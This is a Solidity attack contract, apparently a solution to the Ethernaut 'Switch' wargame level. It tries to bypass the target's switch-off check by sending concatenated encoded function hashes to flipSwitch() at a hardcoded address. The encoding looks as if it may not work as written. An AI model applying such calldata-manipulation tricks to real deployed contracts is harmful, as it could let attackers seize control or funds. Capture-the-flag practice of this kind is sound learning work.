// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Switch {
    address public constant ethernaunt = 0x765C058cd8D2Ed6B598FDD419Ad96695129ad316;
    IExpose target;
    address owner;

    constructor() {
        target = IExpose(ethernaunt);
        owner = msg.sender;
    }

    function turnSwitchOn() external {
        bytes memory fun1 =  abi.encode(keccak256("turnSwitchOff()"));
        bytes memory fun2 =  abi.encode(keccak256("turnSwitchOn()"));
        bytes memory fun = bytes.concat(fun1,fun2);
        target.flipSwitch(fun);
    }

    function getSwitch() external returns(bool){
       return target.switchOn();
    }
}


interface IExpose {
    function flipSwitch(bytes memory _data) external;
    function switchOn() external returns(bool);
}